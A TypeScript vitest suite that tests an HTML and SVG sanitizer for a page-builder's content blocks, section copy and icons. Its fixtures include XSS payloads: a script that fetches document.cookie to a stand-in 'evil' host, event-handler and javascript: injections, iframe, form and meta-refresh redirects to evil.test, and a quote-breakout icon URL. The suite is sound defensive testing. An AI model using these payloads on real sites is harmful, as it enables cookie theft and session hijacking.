import { describe, it, expect } from "vitest";
import { sanitizeBlockHtml, sanitizeBlocks, sanitizeIcon, sanitizeSectionContent } from "@/lib/sanitize-html";
import { newBlock, normalizeBlocks, type Block } from "@/lib/blocks";

const html = (code: string): Block => ({ ...newBlock("html"), props: { code } });
const text = (h: string): Block => ({ ...newBlock("text"), props: { html: h } });

describe("sanitizeBlockHtml — nothing that executes", () => {
  const attacks: [string, string][] = [
    ["a script tag", `<p>ok</p><script>fetch('//evil/'+document.cookie)</script>`],
    ["an inline handler", `<div onclick="steal()">click</div>`],
    ["an onerror on a broken image", `<img src="x" onerror="steal()">`],
    ["a javascript: link", `<a href="javascript:steal()">go</a>`],
    ["an iframe", `<iframe src="https://evil.test"></iframe>`],
    ["an object", `<object data="evil.swf"></object>`],
    ["an embed", `<embed src="evil.swf">`],
    ["a form posting elsewhere", `<form action="https://evil.test"><input name="card"></form>`],
    ["a style block", `<style>body{display:none}</style>`],
    ["a meta refresh", `<meta http-equiv="refresh" content="0;url=https://evil.test">`],
    ["a base tag", `<base href="https://evil.test/">`],
    ["an svg script", `<svg><script>steal()</script></svg>`],
    ["a data: URL image", `<img src="data:text/html;base64,PHNjcmlwdD4=">`],
  ];

  it.each(attacks)("strips %s", (_name, dirty) => {
    const clean = sanitizeBlockHtml(dirty);
    expect(clean).not.toMatch(/<script|<iframe|<object|<embed|<form|<style|<meta|<base/i);
    expect(clean).not.toMatch(/on\w+\s*=/i);
    expect(clean).not.toMatch(/javascript:/i);
    expect(clean).not.toMatch(/data:text\/html/i);
  });

  it("keeps the layout markup the block exists for", () => {
    const clean = sanitizeBlockHtml(
      `<div class="grid"><h3 id="x">Title</h3><p style="text-align:center">Body</p>` +
        `<table><tr><td colspan="2">Cell</td></tr></table></div>`,
    );
    expect(clean).toContain("<div");
    expect(clean).toContain('class="grid"');
    expect(clean).toContain("<h3");
    expect(clean).toContain("text-align:center");
    expect(clean).toContain("colspan");
  });

  it("keeps a normal link but forces rel on it", () => {
    const clean = sanitizeBlockHtml(`<a href="https://example.com" target="_blank">go</a>`);
    expect(clean).toContain('href="https://example.com"');
    expect(clean).toContain("noopener");
  });

  it("refuses a style that fetches — a url() is a request even without a script", () => {
    const clean = sanitizeBlockHtml(`<div style="background-image:url(https://evil.test/track.gif)">x</div>`);
    expect(clean).not.toContain("evil.test");
  });

  it("does not let a style value carry a second declaration", () => {
    const clean = sanitizeBlockHtml(`<p style="color:red;behavior:url(evil.htc)">x</p>`);
    expect(clean).not.toContain("behavior");
  });

  it("returns an empty string for nothing", () => {
    expect(sanitizeBlockHtml("")).toBe("");
  });
});

describe("sanitizeBlocks", () => {
  it("cleans an html block's code", () => {
    const out = sanitizeBlocks([html(`<p>hi</p><script>steal()</script>`)]);
    expect(String(out[0].props.code)).toBe("<p>hi</p>");
  });

  it("cleans a text block's rich text", () => {
    const out = sanitizeBlocks([text(`<p>hi</p><img src=x onerror=steal()>`)]);
    expect(String(out[0].props.html)).not.toMatch(/onerror/i);
  });

  it("reaches blocks nested inside a row's columns", () => {
    // The one that would be missed by a shallow pass — and a nested block
    // renders exactly like a top-level one.
    const row = newBlock("row");
    row.columns![1] = [html(`<script>steal()</script><b>safe</b>`)];
    const out = sanitizeBlocks([row]);
    expect(String(out[0].columns![1][0].props.code)).not.toContain("script");
    expect(String(out[0].columns![1][0].props.code)).toContain("safe");
  });

  it("leaves blocks that carry no markup alone", () => {
    const b = newBlock("spacer");
    expect(sanitizeBlocks([b])[0]).toEqual(b);
  });

  it("does not mutate the input", () => {
    const b = html(`<script>x</script>`);
    sanitizeBlocks([b]);
    expect(String(b.props.code)).toContain("script");
  });
});

describe("sanitizeSectionContent", () => {
  it("cleans the Copy field, which was going in raw before", () => {
    const out = sanitizeSectionContent({ copy: `<p>Real</p><script>steal()</script>` });
    expect(String(out.copy)).toBe("<p>Real</p>");
  });

  it("cleans and normalizes blocks together", () => {
    const out = sanitizeSectionContent({
      blocks: [{ type: "html", props: { code: `<script>steal()</script><p>ok</p>` } }, { type: "nope" }],
    });
    const blocks = out.blocks as Block[];
    expect(blocks).toHaveLength(1);
    expect(String(blocks[0].props.code)).toBe("<p>ok</p>");
  });

  it("leaves a section that has no blocks without a blocks key", () => {
    expect("blocks" in sanitizeSectionContent({ heading: "x" })).toBe(false);
  });

  it("passes typed fields through untouched", () => {
    const content = { heading: "Keep me", steps: [{ title: "a", body: "b" }] };
    expect(sanitizeSectionContent(content)).toMatchObject(content);
  });

  it("turns a hostile blocks value into an empty canvas rather than throwing", () => {
    expect(sanitizeSectionContent({ blocks: "not an array" }).blocks).toEqual([]);
    expect(sanitizeSectionContent({ blocks: null }).blocks).toEqual([]);
  });

  it("is stable — sanitizing twice changes nothing more", () => {
    const once = sanitizeSectionContent({ copy: `<p>x</p><script>y</script>`, blocks: [html(`<b>k</b>`)] });
    expect(sanitizeSectionContent(once)).toEqual(once);
  });

  it("what survives the sanitizer also survives normalizeBlocks", () => {
    // Both run on save. If they disagreed, a block could be cleaned and then
    // dropped, or dropped and then rendered.
    const out = sanitizeSectionContent({ blocks: [text("<p>a</p>"), newBlock("row")] });
    expect(normalizeBlocks(out.blocks)).toEqual(out.blocks);
  });
});

describe("sanitizeIcon", () => {
  it("keeps a plain inline SVG", () => {
    const out = sanitizeIcon('<svg viewBox="0 0 24 24"><path d="M4 10l4 4 8-9" stroke="currentColor"/></svg>');
    expect(out).toContain("<svg");
    expect(out).toContain('d="M4 10l4 4 8-9"');
    expect(out).toContain("viewBox");
  });

  it("strips anything that executes", () => {
    for (const bad of [
      '<svg onload="steal()"><path d="M1 1"/></svg>',
      '<svg><script>steal()</script><path d="M1 1"/></svg>',
      '<svg><foreignObject><iframe src="//evil"></iframe></foreignObject></svg>',
      '<svg><a href="javascript:steal()"><path d="M1 1"/></a></svg>',
    ]) {
      const out = sanitizeIcon(bad);
      expect(out).not.toMatch(/script|iframe|foreignObject|onload|javascript:/i);
      expect(out).toContain("<svg");
    }
  });

  it("takes a plain https URL", () => {
    expect(sanitizeIcon("https://x.test/logo.svg")).toBe("https://x.test/logo.svg");
  });

  it("refuses a URL carrying quotes or angle brackets", () => {
    expect(sanitizeIcon('https://x.test/a.svg" onerror="steal()')).toBe("");
  });

  it("cleans icons inside a cards block", () => {
    const cards = { ...newBlock("cards"), props: { items: [{ title: "a", body: "", icon: '<svg onload="x"><path d="M1 1"/></svg>' }] } };
    const out = sanitizeBlocks([cards]);
    expect(JSON.stringify(out)).not.toContain("onload");
  });

  it("returns nothing for nothing", () => {
    expect(sanitizeIcon("")).toBe("");
    expect(sanitizeIcon("   ")).toBe("");
  });
});
